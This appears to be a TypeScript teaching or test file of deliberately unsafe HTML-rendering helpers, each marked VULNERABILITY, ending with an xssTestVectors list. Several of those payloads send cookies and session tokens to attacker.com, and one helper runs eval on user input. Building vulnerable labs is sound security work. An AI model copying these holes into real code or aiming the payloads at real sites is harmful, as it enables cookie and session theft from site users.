// Unsafe rendering utility functions
// These functions demonstrate various XSS vulnerabilities and unsafe practices

/**
 * VULNERABILITY: Direct HTML injection without sanitization
 * This function directly injects user content into the DOM
 */
export function unsafeRenderHTML(content: string): string {
  // Direct return of user content - major XSS risk
  return content
}

/**
 * VULNERABILITY: innerHTML manipulation with user content
 * Creates DOM elements with user-controlled content
 */
export function unsafeCreateElement(tagName: string, content: string, attributes: Record<string, string> = {}): string {
  let element = `<${tagName}`
  
  // VULNERABILITY: Attributes are not escaped
  for (const [key, value] of Object.entries(attributes)) {
    element += ` ${key}="${value}"`
  }
  
  element += `>${content}</${tagName}>`
  return element
}

/**
 * VULNERABILITY: Dynamic script generation
 * Generates script tags with user content
 */
export function unsafeInlineScript(jsCode: string): string {
  // MAJOR VULNERABILITY: Direct script injection
  return `<script>${jsCode}</script>`
}

/**
 * VULNERABILITY: URL manipulation without validation
 * Creates links with user-controlled URLs
 */
export function unsafeCreateLink(url: string, text: string, attributes: Record<string, string> = {}): string {
  // VULNERABILITY: URL not validated, could be javascript: protocol
  let link = `<a href="${url}"`
  
  for (const [key, value] of Object.entries(attributes)) {
    link += ` ${key}="${value}"`
  }
  
  link += `>${text}</a>`
  return link
}

/**
 * VULNERABILITY: CSS injection
 * Allows user-controlled CSS styles
 */
export function unsafeInlineStyle(styles: string): string {
  // VULNERABILITY: CSS injection can lead to XSS
  return `<style>${styles}</style>`
}

/**
 * VULNERABILITY: Template literal injection
 * Uses template literals with user content
 */
export function unsafeTemplate(template: string, data: Record<string, any>): string {
  let result = template
  
  // VULNERABILITY: Direct replacement without escaping
  for (const [key, value] of Object.entries(data)) {
    const placeholder = `{{${key}}}`
    result = result.replace(new RegExp(placeholder, 'g'), String(value))
  }
  
  return result
}

/**
 * VULNERABILITY: Event handler injection
 * Creates elements with user-controlled event handlers
 */
export function unsafeEventHandler(element: string, event: string, handler: string): string {
  // VULNERABILITY: Event handlers not validated
  return `<${element} ${event}="${handler}"></${element}>`
}

/**
 * VULNERABILITY: iframe embedding with user URLs
 * Creates iframes with user-controlled sources
 */
export function unsafeEmbed(src: string, width: string = '100%', height: string = '400'): string {
  // VULNERABILITY: iframe src not validated
  return `<iframe src="${src}" width="${width}" height="${height}" frameborder="0"></iframe>`
}

/**
 * VULNERABILITY: Base64 decode and render
 * Decodes base64 content and renders it directly
 */
export function unsafeBase64Render(base64Content: string): string {
  try {
    // VULNERABILITY: Decoded content rendered without validation
    const decoded = atob(base64Content)
    return decoded
  } catch (e) {
    return 'Invalid base64 content'
  }
}

/**
 * VULNERABILITY: JSON to HTML conversion
 * Converts JSON data to HTML without proper escaping
 */
export function unsafeJSONToHTML(jsonData: any): string {
  if (typeof jsonData === 'string') {
    // VULNERABILITY: String content not escaped
    return jsonData
  }
  
  if (typeof jsonData === 'object' && jsonData !== null) {
    let html = '<div>'
    for (const [key, value] of Object.entries(jsonData)) {
      // VULNERABILITY: Both key and value unescaped
      html += `<div><strong>${key}:</strong> ${value}</div>`
    }
    html += '</div>'
    return html
  }
  
  return String(jsonData)
}

/**
 * VULNERABILITY: Dynamic component rendering
 * Renders components based on user input
 */
export function unsafeDynamicComponent(componentName: string, props: Record<string, any>): string {
  let component = `<${componentName}`
  
  // VULNERABILITY: Props not validated or escaped
  for (const [key, value] of Object.entries(props)) {
    if (typeof value === 'string') {
      component += ` ${key}="${value}"`
    } else if (typeof value === 'boolean') {
      component += value ? ` ${key}` : ''
    }
  }
  
  component += `></${componentName}>`
  return component
}

/**
 * VULNERABILITY: Markdown-like parsing without sanitization
 * Converts markdown-like syntax to HTML unsafely
 */
export function unsafeMarkdownToHTML(markdown: string): string {
  let html = markdown
  
  // VULNERABILITY: These replacements create HTML without validation
  html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')  // Bold
  html = html.replace(/\*(.*?)\*/g, '<em>$1</em>')              // Italic  
  html = html.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, '<a href="$2">$1</a>') // Links
  html = html.replace(/`([^`]+)`/g, '<code>$1</code>')          // Code
  html = html.replace(/\n/g, '<br>')                            // Line breaks
  
  return html
}

/**
 * VULNERABILITY: XML parsing and rendering
 * Parses XML-like content and renders it as HTML
 */
export function unsafeXMLToHTML(xmlString: string): string {
  // VULNERABILITY: Direct transformation without validation
  return xmlString.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&lt;(\w+)&gt;/g, '<$1>').replace(/&lt;\/(\w+)&gt;/g, '</$1>')
}

/**
 * Collection of XSS test vectors for demonstration
 */
export const xssTestVectors = {
  basic: [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')"></svg>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>'
  ],
  
  advanced: [
    '<script>fetch("/api/admin").then(r=>r.text()).then(alert)</script>',
    '<img src="x" onerror="document.location=\'http://attacker.com/?cookie=\'+document.cookie">',
    '<svg><script>eval(atob("YWxlcnQoJ1hTUycp"))</script></svg>',
    '<iframe src="data:text/html,<script>parent.alert(\'XSS\')</script>"></iframe>'
  ],
  
  evasion: [
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>setTimeout("alert(\'XSS\')",1000)</script>',
    '<img src="javascript:alert(\'XSS\')" onerror="this.src=\'x\'">',
    '<svg><animate attributeName="onclick" values="alert(\'XSS\')"></animate></svg>'
  ],
  
  cookieTheft: [
    '<script>alert("Cookie: " + document.cookie)</script>',
    '<img src="x" onerror="fetch(\'http://attacker.com/steal?c=\' + document.cookie)">',
    '<script>new Image().src="http://attacker.com/log?cookie="+document.cookie</script>'
  ],
  
  sessionHijacking: [
    '<script>alert("Session: " + sessionStorage.getItem("token"))</script>',
    '<script>localStorage.setItem("malicious", "payload")</script>',
    '<script>document.location="http://attacker.com/hijack?session="+localStorage.getItem("session")</script>'
  ]
}

/**
 * VULNERABILITY: Direct execution of user-provided JavaScript
 * This function demonstrates the most dangerous type of XSS
 */
export function unsafeExecuteJS(jsCode: string): void {
  try {
    // CRITICAL VULNERABILITY: Direct code execution
    // eslint-disable-next-line no-eval
    eval(jsCode)
  } catch (e) {
    console.error('JavaScript execution error:', e)
  }
}

/**
 * Utility to demonstrate different XSS contexts
 */
export const xssContexts = {
  htmlContent: (userInput: string) => `<div>${userInput}</div>`,
  htmlAttribute: (userInput: string) => `<div title="${userInput}">Content</div>`,
  javascriptString: (userInput: string) => `<script>var msg = "${userInput}"; alert(msg);</script>`,
  javascriptVariable: (userInput: string) => `<script>var userInput = ${userInput}; console.log(userInput);</script>`,
  cssValue: (userInput: string) => `<div style="color: ${userInput};">Content</div>`,
  urlParameter: (userInput: string) => `<a href="http://example.com?param=${userInput}">Link</a>`
}